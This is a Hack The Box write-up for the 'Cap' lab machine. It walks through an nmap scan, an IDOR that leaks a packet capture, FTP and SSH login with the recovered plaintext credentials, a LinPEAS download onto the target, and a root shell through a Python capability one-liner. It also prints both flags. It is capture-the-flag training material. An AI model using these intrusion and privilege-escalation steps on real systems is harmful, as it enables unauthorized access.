# 🐧HTB Machines: Cap Write-up

**Machine Name**: Cap  
**Difficulty**: Easy  
**OS**: Linux   
**Points**: 20
**User flag:** e7f619c99ada7905c64d86afe0308d6d
**Root flag:** 88d390808d6e64f61d4aedc273f3b1ef

---

## 🌐 VPN Connection

```bash
sudo openvpn lab_TeaneX.ovpn
````

Connects to HTB lab environment using the provided `.ovpn` file.

---

## 🔍 Initial Nmap Scan

```bash
sudo nmap -A 10.10.10.245 -T5 -o Init_scan.txt
```

- `-A`: Aggressive scan (OS detection, script scanning, etc.)
    
- `-T5`: Fastest timing
    
- `-o Init_scan.txt`: Output results to a file
    

**Result Summary:**

- **FTP (21)**: vsftpd 3.0.3
    
- **SSH (22)**: OpenSSH 8.2p1
    
- **HTTP (80)**: Gunicorn/20.0.4: "Security Dashboard"
    
---
📝 Message: **Put the IP in here and go to Dashboard.**

![[cap 1.png]]

📝 Message: **10.10.10.245/data/0**
![[cap 2.png]]

📝 Message: **Download this**
![[cap 3.png]]

📝 Message: **Then open this wireshark.** 
![[cap 4.png]]

📝 Message: **Get the password out of this.**
![[cap 5.png]]

## 📂 FTP Access

```bash
ftp nathan@10.10.10.245
```

- **Username**: `nathan`
    
- **Password**: `Buck3tH4TF0RM3!`
    
- **Successful login**
    
- Found and downloaded `user.txt`:
    
```bash
ls
```

```bash
get user.txt
```
### 🔑 User Flag

```bash
cat user.txt
```

```
e7f619c99ada7905c64d86afe0308d6d
```

---

## 🔐 SSH Access

```bash
ssh nathan@10.10.10.245
```

- Same credentials used.
    
- Dropped into an interactive shell for further enumeration.
    

---

## 🔍 SUID Binary Check

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- Looks for binaries with the SUID bit.
    
- Nothing custom found; all standard binaries.
    

---

## 📅 Cron Job Check

```bash
cat /etc/crontab
```

- Checks for scheduled tasks.
    
- No suspicious or custom entries found.
    

---
>Open a new tab here `ctrl+shift+t`

### 📥Downloads `linpeas.sh` from local machine

```bash
https://github.com/peass-ng/PEASS-ng
```

## 🧠 LinPEAS Enumeration

### On Kali (Host)

```bash
python -m http.server
```

- Serves files via HTTP (port 8000 by default)
    
>Go back to the nathan tab and run this cmd

---
### On Target Machine

```bash
wget http://<Your VPN ip>:8000/linpeas.sh
```
![[Pasted image 20250415204818.png]]

--2025-04-15 08:28:50--  http://10.10.14.130:8000/linpeas.sh
Connecting to 10.10.14.130:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840085 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            [===================100%===============================================================================================>] 820.40K   245KB/s    in 3.3s    

2025-04-15 08:28:54 (245 KB/s): `linpeas.sh` saved  840085/840085

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                           
    |---------------------------------------------------------------------------------|                                                                                                                           
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |                                                                                                                          
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                           
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                           
    |---------------------------------------------------------------------------------|                                                                                                                           
    |                                 Thank you!                                      |                                                                                                                           
    \---------------------------------------------------------------------------------/                                                                                                                           
          LinPEAS-ng by carlospolop                                                                                                                                                                               
                                                                                                                                                                                                                  
                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                         
                                ╚════════════════╝                                                                                                                                         

**Input**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Input**
```bash
cd /root
```
**Input**
```bash
ls
```

## 🏁 Root Flag

**Input**
```bash
cat root.txt
```

```
88d390808d6e64f61d4aedc273f3b1ef
```

---
## 📁 Tools Used

- `tcpdump`
- `wireshark`
- `tshark`
- `strings`
- `tcpflow`
- `foremost`

## 🎯 What to Look For

- FTP/Telnet credentials in plaintext
- Base64 encoded messages
- File downloads (like `.zip` or `.txt`)
- HTTP POST requests with hidden data

---
## 🏷️ Tags

#Cap #linux #wireshark #HackTheBox #Web_Exploitation #Insecure_Direct_Object_Reference(IDOR) #Packet_Capture_Analysis #FTP_Enumeration #Linux_Capabilities #Machines 

[[Machines]]
